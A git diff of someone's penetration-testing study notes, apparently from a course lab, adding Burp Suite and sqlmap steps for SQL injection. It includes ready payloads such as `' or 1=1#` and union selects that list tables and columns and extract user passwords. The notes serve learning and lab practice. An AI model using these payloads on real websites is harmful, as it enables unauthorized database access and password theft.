@@ -241,6 +241,7 @@ automated tool to check if there are some potential priv escal inside the target
 
 ----
 ## BurpSuite
+[Change display and HTTP dimension](https://forum.portswigger.net/thread/font-size-would-like-to-increase-3fac8746)
 ### Bruteforcing Login
 Set [[cheet#FoxyProxy]]
 - Turn on the proxy
@@ -261,7 +262,48 @@ Set [[cheet#FoxyProxy]]
 	- Click Start "Attack"
 	- Look for difference inside Status Code and Length
 	Example with images -->  [[Notes/TCM/Capstones/Butler/report#BurpSuite]]
-	
+
+### SQL Injection
+#### Initial things to do
+- turn on [[cheet#FoxyProxy]]
+- click on Target > Scope Settings > Add > `http://domain-you-want-to-hack > Ok > Yes
+    ![[Pasted image 20240307120204.png]]
+- go to Proxy > HTTP history > right click on one of them > Clear History
+  =>
+  in this way if you search for something in google =>  it won't appear in the histo
+#### Repeater
+repeater allows you to -->  inject data and modify them
+- insert valid data inside the website 
+- go to the history and open the POST request
+- always look at -->  response length in the Response (`Content-Length`)
+- right click inside the request > Send to Repeater > Open the Repeater Section
+- try to modify one value to something else > click on Send > <span style="color:#00b050">look at the response length</span>
+                                                     if it's different in length
+  >[!info] Look visually
+  >if you want to look the response visually:
+  >=>
+  >after the Response click on -->  Render
+  >![[Pasted image 20240307123321.png]]
+
+##### Try SQL injection in Repeater
+- add to one of the value -->  `' or 1=1#`
+- to include it -->  select this text > CTRL+U
+- then click on Send 
+
+#### sqlmap 
+Automate finding SQL injection vulnerabilities
+- copy the clean POST request  (without `' or 1=1#`)
+- save it inside a txt file
+- run `sqlmap -r req.txt`
+
+if it said "all tested parameters do not appear to be injectable":
+=>
+What can we do now:
+- go back to manual testing
+- download a list of payloads and try to fuzz it
+- look for other injection points
+
+
 ----
 ### Metasploit
 #### Use a module
@@ -522,6 +564,7 @@ if you have a meterpreter shell -->  you can use the features `upload/download`
 -----
 ## Web Exploitation
 ### SQL Injection
+[SQL Injection Cheet Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 #### Basic check
 - find a value that return something -->  es `jeremy`
 - then try to use characters that might trigger an error:
@@ -549,3 +592,23 @@ we can use it to selects other information or info from another table
 if you find something:
 =>
 `jeremy' union select null,null,version()#` -->  to read the db version
+
+to <span style="color:#00b050">find all the tables </span>that exist in the db:
+`jeremy' union select null,null,table_name from information_schema.tables#`
+
+<span style="color:#00b050">get all the columns name</span> that exist in the db:
+`jeremy' union select null,null,column_name from information_schema.columns#`
+
+get an <span style="color:#00b050">user password</span>:
+`jeremy' union select null,null,password from injection0x01#`
+
+>[!warning] Constraint
+>sometimes if you use something like this:
+>`jeremy' union select null,null,...`
+>
+>and the values in the null columns are not a string => you will get an error
+>=>
+>try to use different things:
+>for example:
+>- null(int)
+>- 1
